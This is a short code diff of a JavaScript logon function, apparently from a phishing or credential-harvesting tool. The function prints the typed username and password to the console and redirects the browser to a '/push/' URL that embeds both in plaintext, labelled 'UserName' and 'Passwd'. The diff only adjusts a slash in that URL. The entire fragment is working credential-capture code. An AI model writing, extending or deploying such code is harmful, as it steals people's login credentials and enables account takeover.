@@ -25,6 +25,6 @@ function logon(){
         console.log("password:"+password)
         console.log("usersname:"+username)
         var url = window.location.href;
-        window.location.href = String('/push/'+url.substring(remote.length)+'[-] UserName: ' + username +" [-] Passwd: " + password).replace('//','/')
+        window.location.href = String('/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password).replace('//','/')
     }
 }
